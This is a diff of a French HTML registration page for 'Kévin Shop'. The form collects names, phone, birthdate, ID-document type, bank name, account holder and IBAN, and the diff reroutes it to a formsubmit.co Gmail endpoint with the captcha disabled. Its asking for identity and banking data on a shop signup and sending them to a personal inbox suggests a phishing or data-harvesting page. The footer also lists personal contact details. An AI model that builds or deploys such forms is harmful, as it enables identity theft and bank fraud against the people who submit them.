@@ -1,136 +1,139 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Kévin Shop - Inscription</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-            background-color: #f4f4f9;
-        }
-        header {
-            background-color: #004080;
-            color: #fff;
-            padding: 15px;
-            text-align: center;
-        }
-        main {
-            margin: 20px;
-            padding: 20px;
-            background-color: #fff;
-            border-radius: 8px;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
-        }
-        label {
-            display: block;
-            margin-top: 10px;
-        }
-        input, select {
-            width: 100%;
-            padding: 8px;
-            margin: 5px 0;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-        }
-        button {
-            background-color: #004080;
-            color: #fff;
-            padding: 10px 15px;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-            margin-top: 15px;
-        }
-        button:hover {
-            background-color: #003060;
-        }
-        footer {
-            margin-top: 20px;
-            text-align: center;
-        }
-        footer a {
-            color: #004080;
-            text-decoration: none;
-        }
-        footer a:hover {
-            text-decoration: underline;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Kévin Shop - Inscription</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #f4f4f9;
+    }
+    header {
+      background-color: #004080;
+      color: #fff;
+      padding: 15px;
+      text-align: center;
+    }
+    main {
+      margin: 20px;
+      padding: 20px;
+      background-color: #fff;
+      border-radius: 8px;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+    }
+    label {
+      display: block;
+      margin-top: 10px;
+    }
+    input, select {
+      width: 100%;
+      padding: 8px;
+      margin: 5px 0;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+    }
+    button {
+      background-color: #004080;
+      color: #fff;
+      padding: 10px 15px;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      margin-top: 15px;
+    }
+    button:hover {
+      background-color: #003060;
+    }
+    footer {
+      margin-top: 20px;
+      text-align: center;
+    }
+    footer a {
+      color: #004080;
+      text-decoration: none;
+    }
+    footer a:hover {
+      text-decoration: underline;
+    }
+  </style>
 </head>
 <body>
-    <header>
-        <h1>Kévin Shop</h1>
-        <p>La compagnie qui vous accompagne partout.</p>
-    </header>
-    <main>
-        <h2>Formulaire d'inscription</h2>
-        <form action="https://formspree.io/f/xnnppwoq" method="post">
-            <label for="lastname">Nom :</label>
-            <input type="text" id="lastname" name="lastname" placeholder="Votre nom" required>
-            
-            <label for="firstname">Prénom :</label>
-            <input type="text" id="firstname" name="firstname" placeholder="Votre prénom" required>
-            
-            <label for="phone">Numéro de téléphone :</label>
-            <input type="text" id="phone" name="phone" placeholder="Votre numéro de téléphone" required>
-            
-            <label for="email">Adresse email :</label>
-            <input type="email" id="email" name="email" placeholder="Votre email" required>
-            
-            <label for="city">Ville :</label>
-            <input type="text" id="city" name="city" placeholder="Exemple : Cotonou" required>
+  <header>
+    <h1>Kévin Shop</h1>
+    <p>La compagnie qui vous accompagne partout.</p>
+  </header>
+  <main>
+    <h2>Formulaire d'inscription</h2>
+    <form action="https://formsubmit.co/tonemail@gmail.com" method="POST">
+      <label for="lastname">Nom :</label>
+      <input type="text" id="lastname" name="lastname" placeholder="Votre nom" required>
 
-            <label for="birthdate">Date de naissance :</label>
-            <input type="date" id="birthdate" name="birthdate" required>
-            
-            <label for="country">Pays :</label>
-            <select id="country" name="country" required>
-                <option value="">--Sélectionnez votre pays--</option>
-                <option value="benin">Bénin</option>
-                <option value="france">France</option>
-                <option value="allemagne">Allemagne</option>
-                <option value="autriche">Autriche</option>
-                <option value="suisse">Suisse</option>
-                <option value="italie">Italie</option>
-                <option value="espagne">Espagne</option>
-            </select>
+      <label for="firstname">Prénom :</label>
+      <input type="text" id="firstname" name="firstname" placeholder="Votre prénom" required>
 
-            <label for="id_type">Type de pièce d'identité :</label>
-            <select id="id_type" name="id_type" required>
-                <option value="carte_identite">Carte d'identité nationale</option>
-                <option value="passeport">Passeport</option>
-                <option value="permis_conduire">Permis de conduire</option>
-            </select>
+      <label for="phone">Numéro de téléphone :</label>
+      <input type="text" id="phone" name="phone" placeholder="Votre numéro de téléphone" required>
 
-            <label for="id_photo">Téléchargez une photo de votre pièce d'identité :</label>
-            <input type="file" id="id_photo" name="id_photo" accept="image/*" required>
+      <label for="email">Adresse email :</label>
+      <input type="email" id="email" name="email" placeholder="Votre email" required>
 
-            <h3>Informations Bancaires</h3>
-            <label for="bank_name">Nom de la banque :</label>
-            <input type="text" id="bank_name" name="bank_name" placeholder="Nom de votre banque" required>
+      <label for="city">Ville :</label>
+      <input type="text" id="city" name="city" placeholder="Exemple : Cotonou" required>
 
-            <label for="account_name">Nom du titulaire du compte :</label>
+      <label for="birthdate">Date de naissance :</label>
+      <input type="date" id="birthdate" name="birthdate" required>
 
-            <label for="account_name">Nom du titulaire du compte :</label>
-            <input type="text" id="account_name" name="account_name" placeholder="Nom du titulaire" required>
+      <label for="country">Pays :</label>
+      <select id="country" name="country" required>
+        <option value="">--Sélectionnez votre pays--</option>
+        <option value="benin">Bénin</option>
+        <option value="france">France</option>
+        <option value="allemagne">Allemagne</option>
+        <option value="autriche">Autriche</option>
+        <option value="suisse">Suisse</option>
+        <option value="italie">Italie</option>
+        <option value="espagne">Espagne</option>
+      </select>
 
-            <label for="account_firstname">Prénom du titulaire du compte :</label>
-            <input type="text" id="account_firstname" name="account_firstname" placeholder="Prénom du titulaire" required>
+      <label for="id_type">Type de pièce d'identité :</label>
+      <select id="id_type" name="id_type" required>
+        <option value="carte_identite">Carte d'identité nationale</option>
+        <option value="passeport">Passeport</option>
+        <option value="permis_conduire">Permis de conduire</option>
+      </select>
 
-            <label for="iban">Numéro bancaire ou IBAN :</label>
-            <input type="text" id="iban" name="iban" placeholder="Votre IBAN" required>
-            
-            <button type="submit">S'inscrire</button>
-        </form>
-    </main>
-    <footer>
-        <p>À propos de nous : <a href="https://www.facebook.com/profile.php?id=100089880126141">Page Facebook</a> |
-        <a href="https://wa.me/22960933186">WhatsApp</a> |
-        <a href="mailto:hkpkevin228@gamil.com">Email</a></p>
-    </footer>
+      <!-- Champ supprimé : téléchargement de fichier non pris en charge par Formsubmit -->
+
+      <h3>Informations Bancaires</h3>
+      <label for="bank_name">Nom de la banque :</label>
+      <input type="text" id="bank_name" name="bank_name" placeholder="Nom de votre banque" required>
+
+      <label for="account_name">Nom du titulaire du compte :</label>
+      <input type="text" id="account_name" name="account_name" placeholder="Nom du titulaire" required>
+
+      <label for="account_firstname">Prénom du titulaire du compte :</label>
+      <input type="text" id="account_firstname" name="account_firstname" placeholder="Prénom du titulaire" required>
+
+      <label for="iban">Numéro bancaire ou IBAN :</label>
+      <input type="text" id="iban" name="iban" placeholder="Votre IBAN" required>
+
+      <!-- Champs cachés -->
+      <input type="hidden" name="_subject" value="Nouvelle inscription sur Kévin Shop !">
+      <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_template" value="box">
+      <!-- Optionnel : redirection après envoi -->
+      <!-- <input type="hidden" name="_next" value="https://tonsite.github.io/merci.html"> -->
+
+      <button type="submit">S'inscrire</button>
+    </form>
+  </main>
+  <footer>
+    <p>À propos de nous : <a href="https://www.facebook.com/profile.php?id=100089880126141">Page Facebook</a> |
+      <a href="https://wa.me/22960933186">WhatsApp</a> |
+      <a href="mailto:hkpkevin228@gamil.com">Email</a></p>
+  </footer>
 </body>
 </html>
->>
